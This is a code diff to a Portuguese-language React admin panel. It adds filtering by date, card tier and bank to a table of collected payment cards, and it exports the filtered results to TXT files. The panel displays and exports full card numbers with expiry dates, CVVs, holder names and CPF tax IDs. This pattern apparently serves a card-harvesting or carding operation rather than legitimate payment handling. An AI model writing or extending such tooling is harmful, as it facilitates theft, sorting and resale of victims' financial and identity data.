@@ -1,15 +1,16 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { Download, LogOut, CreditCard, ShoppingBag, Filter, Calendar } from 'lucide-react';
-import { format } from 'date-fns';
-import { showError, showSuccess } from '@/utils/toast';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Download, LogOut, CreditCard, ShoppingBag, Filter, Search } from 'lucide-react';
+import { format, isWithinInterval, startOfDay, endOfDay } from 'date-fns';
+import { showError } from '@/utils/toast';
 
 const Admin = () => {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
@@ -17,7 +18,14 @@ const Admin = () => {
   const [cards, setCards] = useState<any[]>([]);
   const [orders, setOrders] = useState<any[]>([]);
   const [loading, setLoading] = useState(false);
-  const [dateFilter, setDateFilter] = useState({ from: '', to: '' });
+  
+  // Filtros de Cartões
+  const [cardDateFilter, setCardDateFilter] = useState({ from: '', to: '' });
+  const [filterLevel, setFilterLevel] = useState('all');
+  const [filterBank, setFilterBank] = useState('all');
+
+  // Filtros de Pedidos
+  const [orderDateFilter, setOrderDateFilter] = useState({ from: '', to: '' });
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
@@ -43,9 +51,39 @@ const Admin = () => {
     }
   };
 
+  // Extrair níveis e bancos únicos para os seletores
+  const uniqueLevels = useMemo(() => {
+    const levels = cards.map(c => c.card_level).filter(Boolean);
+    return Array.from(new Set(levels));
+  }, [cards]);
+
+  const uniqueBanks = useMemo(() => {
+    const banks = cards.map(c => c.bank_name).filter(Boolean);
+    return Array.from(new Set(banks));
+  }, [cards]);
+
+  // Lógica de filtragem de cartões
+  const filteredCards = useMemo(() => {
+    return cards.filter(c => {
+      const dateMatch = (!cardDateFilter.from || !cardDateFilter.to) || 
+        isWithinInterval(new Date(c.created_at), {
+          start: startOfDay(new Date(cardDateFilter.from)),
+          end: endOfDay(new Date(cardDateFilter.to))
+        });
+      
+      const levelMatch = filterLevel === 'all' || c.card_level === filterLevel;
+      const bankMatch = filterBank === 'all' || c.bank_name === filterBank;
+      
+      return dateMatch && levelMatch && bankMatch;
+    });
+  }, [cards, cardDateFilter, filterLevel, filterBank]);
+
   const exportCards = () => {
-    let content = "=== LISTA DE CARTÕES REGISTRADOS ===\n\n";
-    cards.forEach((c, i) => {
+    let content = "=== LISTA DE CARTÕES FILTRADOS ===\n";
+    content += `FILTROS: Nível: ${filterLevel} | Banco: ${filterBank}\n`;
+    content += `PERÍODO: ${cardDateFilter.from || 'Início'} até ${cardDateFilter.to || 'Hoje'}\n\n`;
+
+    filteredCards.forEach((c, i) => {
       content += `[${i + 1}] DATA: ${format(new Date(c.created_at), 'dd/MM/yyyy HH:mm')}\n`;
       content += `CARTÃO: ${c.card_number}\n`;
       content += `VALIDADE: ${c.expiry} | CVV: ${c.cvv}\n`;
@@ -60,17 +98,16 @@ const Admin = () => {
     const url = URL.createObjectURL(blob);
     const link = document.createElement('a');
     link.href = url;
-    link.download = `cartoes_${format(new Date(), 'dd-MM-yyyy')}.txt`;
+    link.download = `cartoes_filtrados_${format(new Date(), 'dd-MM-yyyy')}.txt`;
     link.click();
   };
 
   const exportOrders = (status: 'PAID' | 'PENDING') => {
     let filtered = orders.filter(o => o.status === status);
     
-    if (dateFilter.from && dateFilter.to) {
-      const from = new Date(dateFilter.from);
-      const to = new Date(dateFilter.to);
-      to.setHours(23, 59, 59);
+    if (orderDateFilter.from && orderDateFilter.to) {
+      const from = startOfDay(new Date(orderDateFilter.from));
+      const to = endOfDay(new Date(orderDateFilter.to));
       filtered = filtered.filter(o => {
         const date = new Date(o.created_at);
         return date >= from && date <= to;
@@ -78,7 +115,7 @@ const Admin = () => {
     }
 
     let content = `=== PEDIDOS ${status === 'PAID' ? 'PAGOS' : 'PENDENTES'} ===\n`;
-    content += `PERÍODO: ${dateFilter.from || 'Início'} até ${dateFilter.to || 'Hoje'}\n\n`;
+    content += `PERÍODO: ${orderDateFilter.from || 'Início'} até ${orderDateFilter.to || 'Hoje'}\n\n`;
 
     filtered.forEach((o, i) => {
       content += `[${i + 1}] DATA: ${format(new Date(o.created_at), 'dd/MM/yyyy HH:mm')}\n`;
@@ -137,9 +174,14 @@ const Admin = () => {
       <div className="max-w-7xl mx-auto space-y-6">
         <div className="flex justify-between items-center">
           <h1 className="text-2xl font-bold text-gray-900">Painel de Controle</h1>
-          <Button variant="outline" onClick={() => setIsLoggedIn(false)} className="flex items-center gap-2">
-            <LogOut size={18} /> Sair
-          </Button>
+          <div className="flex gap-2">
+            <Button variant="outline" onClick={fetchData} className="flex items-center gap-2">
+              Atualizar Dados
+            </Button>
+            <Button variant="outline" onClick={() => setIsLoggedIn(false)} className="flex items-center gap-2">
+              <LogOut size={18} /> Sair
+            </Button>
+          </div>
         </div>
 
         <Tabs defaultValue="cards" className="w-full">
@@ -153,52 +195,100 @@ const Admin = () => {
           </TabsList>
 
           <TabsContent value="cards">
-            <Card>
-              <CardHeader className="flex flex-row items-center justify-between">
-                <CardTitle>Cartões Registrados ({cards.length})</CardTitle>
-                <Button onClick={exportCards} className="bg-green-600 hover:bg-green-700">
-                  <Download size={18} className="mr-2" /> Exportar TXT
-                </Button>
-              </CardHeader>
-              <CardContent>
-                <div className="overflow-x-auto">
-                  <Table>
-                    <TableHeader>
-                      <TableRow>
-                        <TableHead>Data</TableHead>
-                        <TableHead>Cartão</TableHead>
-                        <TableHead>Validade/CVV</TableHead>
-                        <TableHead>Titular/CPF</TableHead>
-                        <TableHead>Banco/Nível</TableHead>
-                        <TableHead>Bandeira</TableHead>
-                      </TableRow>
-                    </TableHeader>
-                    <TableBody>
-                      {cards.map((c) => (
-                        <TableRow key={c.id}>
-                          <TableCell className="text-xs">{format(new Date(c.created_at), 'dd/MM HH:mm')}</TableCell>
-                          <TableCell className="font-mono font-bold">{c.card_number}</TableCell>
-                          <TableCell>{c.expiry} | {c.cvv}</TableCell>
-                          <TableCell className="text-xs">
-                            <div className="font-bold">{c.name}</div>
-                            <div className="text-gray-400">{c.cpf}</div>
-                          </TableCell>
-                          <TableCell className="text-xs">
-                            <div className="font-bold text-blue-600">{c.bank_name || 'Desconhecido'}</div>
-                            <div className="uppercase text-[10px]">{c.card_level || 'Standard'}</div>
-                          </TableCell>
-                          <TableCell>
-                            <span className="px-2 py-1 rounded bg-gray-100 text-[10px] font-bold uppercase">
-                              {c.brand}
-                            </span>
-                          </TableCell>
+            <div className="space-y-6">
+              <Card>
+                <CardHeader>
+                  <CardTitle className="flex items-center gap-2 text-sm">
+                    <Filter size={16} /> Filtros de Cartão
+                  </CardTitle>
+                </CardHeader>
+                <CardContent className="grid grid-cols-1 md:grid-cols-4 gap-4 items-end">
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold">Data Inicial:</label>
+                    <Input type="date" value={cardDateFilter.from} onChange={e => setCardDateFilter({...cardDateFilter, from: e.target.value})} />
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold">Data Final:</label>
+                    <Input type="date" value={cardDateFilter.to} onChange={e => setCardDateFilter({...cardDateFilter, to: e.target.value})} />
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold">Nível/Categoria:</label>
+                    <Select value={filterLevel} onValueChange={setFilterLevel}>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Todos os níveis" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="all">Todos os níveis</SelectItem>
+                        {uniqueLevels.map(level => (
+                          <SelectItem key={level} value={level}>{level}</SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold">Banco:</label>
+                    <Select value={filterBank} onValueChange={setFilterBank}>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Todos os bancos" />
+                      </SelectTrigger>
+                      <SelectContent>
+                        <SelectItem value="all">Todos os bancos</SelectItem>
+                        {uniqueBanks.map(bank => (
+                          <SelectItem key={bank} value={bank}>{bank}</SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
+                </CardContent>
+              </Card>
+
+              <Card>
+                <CardHeader className="flex flex-row items-center justify-between">
+                  <CardTitle>Cartões Registrados ({filteredCards.length})</CardTitle>
+                  <Button onClick={exportCards} className="bg-green-600 hover:bg-green-700">
+                    <Download size={18} className="mr-2" /> Exportar Filtrados
+                  </Button>
+                </CardHeader>
+                <CardContent>
+                  <div className="overflow-x-auto">
+                    <Table>
+                      <TableHeader>
+                        <TableRow>
+                          <TableHead>Data</TableHead>
+                          <TableHead>Cartão</TableHead>
+                          <TableHead>Validade/CVV</TableHead>
+                          <TableHead>Titular/CPF</TableHead>
+                          <TableHead>Banco/Nível</TableHead>
+                          <TableHead>Bandeira</TableHead>
                         </TableRow>
-                      ))}
-                    </TableBody>
-                  </Table>
-                </div>
-              </CardContent>
-            </Card>
+                      </TableHeader>
+                      <TableBody>
+                        {filteredCards.map((c) => (
+                          <TableRow key={c.id}>
+                            <TableCell className="text-xs">{format(new Date(c.created_at), 'dd/MM HH:mm')}</TableCell>
+                            <TableCell className="font-mono font-bold">{c.card_number}</TableCell>
+                            <TableCell>{c.expiry} | {c.cvv}</TableCell>
+                            <TableCell className="text-xs">
+                              <div className="font-bold">{c.name}</div>
+                              <div className="text-gray-400">{c.cpf}</div>
+                            </TableCell>
+                            <TableCell className="text-xs">
+                              <div className="font-bold text-blue-600">{c.bank_name || 'Desconhecido'}</div>
+                              <div className="uppercase text-[10px]">{c.card_level || 'Standard'}</div>
+                            </TableCell>
+                            <TableCell>
+                              <span className="px-2 py-1 rounded bg-gray-100 text-[10px] font-bold uppercase">
+                                {c.brand}
+                              </span>
+                            </TableCell>
+                          </TableRow>
+                        ))}
+                      </TableBody>
+                    </Table>
+                  </div>
+                </CardContent>
+              </Card>
+            </div>
           </TabsContent>
 
           <TabsContent value="orders">
@@ -206,17 +296,17 @@ const Admin = () => {
               <Card>
                 <CardHeader>
                   <CardTitle className="flex items-center gap-2">
-                    <Filter size={18} /> Filtros de Exportação
+                    <Filter size={18} /> Filtros de Pedidos
                   </CardTitle>
                 </CardHeader>
                 <CardContent className="flex flex-wrap gap-4 items-end">
                   <div className="space-y-2">
                     <label className="text-xs font-bold">De:</label>
-                    <Input type="date" value={dateFilter.from} onChange={e => setDateFilter({...dateFilter, from: e.target.value})} />
+                    <Input type="date" value={orderDateFilter.from} onChange={e => setOrderDateFilter({...orderDateFilter, from: e.target.value})} />
                   </div>
                   <div className="space-y-2">
                     <label className="text-xs font-bold">Até:</label>
-                    <Input type="date" value={dateFilter.to} onChange={e => setDateFilter({...dateFilter, to: e.target.value})} />
+                    <Input type="date" value={orderDateFilter.to} onChange={e => setOrderDateFilter({...orderDateFilter, to: e.target.value})} />
                   </div>
                   <div className="flex gap-2">
                     <Button onClick={() => exportOrders('PAID')} className="bg-green-600">Exportar Pagos</Button>
